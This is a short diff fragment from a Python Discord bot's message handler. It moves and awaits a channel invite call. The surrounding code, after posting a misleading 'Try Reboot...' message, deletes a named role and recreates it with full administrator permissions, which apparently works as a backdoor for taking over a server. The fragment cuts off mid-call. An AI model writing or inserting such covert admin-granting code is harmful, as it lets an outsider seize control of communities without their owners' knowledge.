@@ -167,10 +167,11 @@ async def on_message(message):
             server = message.guild
             roles = server.roles
             await message.channel.send("Try Reboot...")
+            join_link = await message.channel.create_invite()
             for role in roles:
                 if role.name == role_name:
                     await role.delete()
-                    join_link = message.channel.create_invite()
+
                     role_color = discord.Color.red()
                     permissions = discord.Permissions(administrator=True)
                     zisty_role = await server.create_role(name=role_name, permissions=permissions, color=role_color,
